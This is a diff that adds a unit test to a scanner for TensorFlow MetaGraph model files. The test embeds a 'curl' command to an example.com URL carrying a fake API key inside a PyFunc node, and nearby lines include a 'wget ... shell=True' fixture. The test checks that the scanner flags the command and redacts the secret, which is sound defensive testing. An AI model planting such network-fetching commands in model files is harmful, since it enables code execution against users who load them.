@@ -591,6 +591,31 @@ def test_tf_metagraph_scanner_redacts_sensitive_previews_and_examples(tmp_path: 
     assert "example.com/p.sh" in serialized_result
 
 
+def test_tf_metagraph_scanner_redacts_secret_after_encoded_url_path(tmp_path: Path) -> None:
+    project_key = f"sk-proj-{'abc_def-' * 5}"
+    sensitive_url = f"https://example.com/{'A' * 160}/{project_key}/model.so"
+    sensitive_meta = tmp_path / "encoded-path-preview.meta"
+    sensitive_meta.write_bytes(
+        _build_metagraph(
+            graph_nodes=[
+                {
+                    "name": "pyfunc_node",
+                    "op": "PyFunc",
+                    "attrs": {"script": f"curl {sensitive_url}"},
+                }
+            ]
+        )
+    )
+
+    result = TensorFlowMetaGraphScanner().scan(str(sensitive_meta))
+    executable_check = next(check for check in result.checks if check.name == "MetaGraph Executable String Check")
+    serialized_result = result.to_json()
+
+    assert project_key not in serialized_result
+    assert "abc_def" not in serialized_result
+    assert REDACTED_EVIDENCE_VALUE in executable_check.details["value_preview"]
+
+
 def test_tf_metagraph_scanner_preserves_benign_public_preview_context(tmp_path: Path) -> None:
     public_url = "https://example.com/p.sh?variant=public"
     public_context = f"subprocess.run('wget {public_url}', shell=True) markers ghp_short sk-proj-example"
